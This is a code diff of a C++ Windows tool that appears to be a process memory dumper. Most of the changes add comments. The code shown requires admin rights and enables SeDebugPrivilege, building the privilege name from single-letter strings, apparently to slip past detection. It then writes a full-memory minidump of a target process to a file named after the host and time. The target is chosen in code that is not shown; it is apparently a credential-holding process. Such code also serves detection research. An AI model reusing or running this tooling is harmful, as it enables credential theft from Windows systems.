@@ -63,6 +63,7 @@ DWORD getProcessPid()
 // Source: https://www.unknowncheats.me/forum/1872353-post36.html
 bool SetPrivilege()
 {
+	// Generate privilege name object
 	string str1 = "S";
 	string str2 = "P";
 	string str3 = "e";
@@ -77,7 +78,7 @@ bool SetPrivilege()
 	string privilegename_str = str1 + str3 + str5 + str3 + str7 + str9 + str11 + str2 + str4 + str6 + str8 + str6 + str10 + str3 + str11 + str3;
 	std::wstring privilege_name(privilegename_str.begin(), privilegename_str.end());
 	const wchar_t* privName = privilege_name.c_str();
-
+	// Adjust token privileges
 	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
 	HANDLE hToken = NULL;
 	LUID luid = { 0,0 };
@@ -117,6 +118,7 @@ string getHostname() {
 	return stringcompname;
 }
 
+
 // Source for tm struct in case you want to add or delete something: https://www.cplusplus.com/reference/ctime/tm/
 string getFileName(string hostname) {
 	// Extension of the file
@@ -124,7 +126,6 @@ string getFileName(string hostname) {
 	// Get time
 	time_t t = time(NULL);
 	tm* timePtr = localtime(&t);
-
 	// Create filename. Format: hostname_01-12-2021-1200
 	stringstream filenamestream;
 	string filename;
@@ -145,15 +146,17 @@ string getFileName(string hostname) {
 
 
 int main() {
+	// Check elevated process
 	if (! IsElevatedProcess()) {
 		wcout << "[-] Error: Execute with administrative provileges." << endl;
 		return 1;
 	}
-	
+
+	// Get process PID
 	DWORD processPID = getProcessPid();
 	wcout << "[+] Process PID: " << processPID << endl;
 
-	// Get hostname and file name
+	// Get hostname and generate file name
 	string hostname = getHostname();
 	string filename = getFileName(hostname);
 	// Source: https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
@@ -164,9 +167,7 @@ int main() {
 	HANDLE outFile = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	// Enable SeDebugPrivilege privilege
-	
 	SetPrivilege();
-	//SetPrivilege(L"SeDebugPrivilege", TRUE);
 
 	// Create handle to the process
 	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION; // PROCESS_ALL_ACCESS;
@@ -177,7 +178,6 @@ int main() {
 		wcout << "[+] Success: Handle to process created correctly." << endl;
 		// From https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type - MiniDumpWithFullMemory = 0x00000002
 		BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
-
 		if (isDumped) {
 			cout << "[+] Successfully dumped process with pid " << processPID << " to file " << filename << endl;
 		}
